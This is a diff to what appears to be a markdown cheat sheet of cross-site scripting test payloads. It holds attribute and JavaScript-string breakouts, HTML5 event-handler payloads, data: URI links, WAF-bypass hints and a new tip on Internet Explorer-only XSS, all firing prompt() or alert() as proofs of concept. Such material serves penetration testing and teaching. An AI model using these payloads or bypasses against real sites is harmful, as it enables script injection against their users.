@@ -20,7 +20,7 @@ If you just need to break out for Proof of Concept and can't use a > to close yo
 ```html
 " onclick="prompt(1)
 ```
-WAF got you down?
+WAF got you down? There are a ton of bypasses, look at HTML5 for more ideas also (Just remember IE vs Firefox and HTML5 support.
 ```html
 <body onpageshow="prompt(123)">
 <details open ontoggle="prompt('xss via toggle')">Toggle Me For More prompts</details>
@@ -29,18 +29,18 @@ WAF got you down?
 
 Don't forget the injection might not be a form tag but in the javascript.
 ==============
-```javascript
+```html
 ";prompt(1);//
 
 ';prompt(1);//
 ```
 
 What if they are in a function? Break out of it. Count the brackets, etc to kill the function.
-```javascript
+```html
 "};prompt(1);//
 ```
 You may need to reconstruct the function
-```javascript
+```html
 "};prompt(1);function whatever(){//
 ```
 
@@ -70,3 +70,6 @@ Just for fun
 ```html
 <a/href="data:text/html;charset=utf-8,<script>alert(123)</script>">Just Interesting</a>
 ```
+Internet Explorer can be your friend
+==============
+A lot of times you will notice that " or ' has become %22 or %27 in Chrome, Firefox, Opera etc. But did you try Internet Explorer. Many times you can get an Internet Explorer only XSS due to how the browser works.
